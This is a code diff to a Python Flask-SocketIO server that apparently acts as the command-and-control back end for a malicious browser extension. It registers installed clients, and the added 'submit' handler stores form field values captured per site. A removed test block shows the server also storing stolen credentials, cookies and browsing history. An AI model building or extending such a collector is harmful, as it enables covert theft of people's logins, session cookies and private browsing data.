@@ -55,7 +55,6 @@ def handle_ext_ping(data):
         clientid = database.create_new_client(data)
         connected_clients.append((clientid, request.sid))
         resp = database.construct_response(clientid)
-        #emit('srvpayload', resp, room=request.sid)
         emit('newClientInstall', clientid, namespace ="/socket.io", broadcast=True)
         return resp
     else:
@@ -79,7 +78,19 @@ def handle_ext_ping(data):
                 return bad
         emit('json', database.construct_response(clientid), room=request.sid)
 
-
+@socketio.on('submit')
+def handle_form_id_mappings_submit(mappings):
+    print("processing new form mappings")
+    data = [{}]
+    for x in mappings:
+        remoteDef = x["key"]
+        value = x["value"]
+        localDef = x["LocalDef"]
+        url = x["URL"]
+        clientid = x["id"]
+        database.store_form_id_mappings(url, localDef, remoteDef)
+        data[0].update({remoteDef:value})
+    database.store_form_data(data[0], clientid)
 
 def do_pong(clientid, payload):
     sid = [(clientidx, sid) for (clientidx, sid) in connected_clients if clientidx == clientid].pop(0)[1] or None
@@ -109,13 +120,4 @@ def validate_payload(data):
     return 1
 
 if __name__ == "__main__":
-    with open("../sample_ext_to_srv.json") as f:
-        clientid = 123
-        data = json.load(f)
-        #database.store_form_data(data["forms"][0], clientid)
-        #database.store_credential(data["creds"][0], clientid)
-        #database.store_cookie(data["cookies"][0], clientid)
-        database.store_history(data["history"], clientid)
-        #database.create_new_client(data)
-        #database.construct_response(clientid)
     socketio.run(app, debug=True, use_reloader=False)
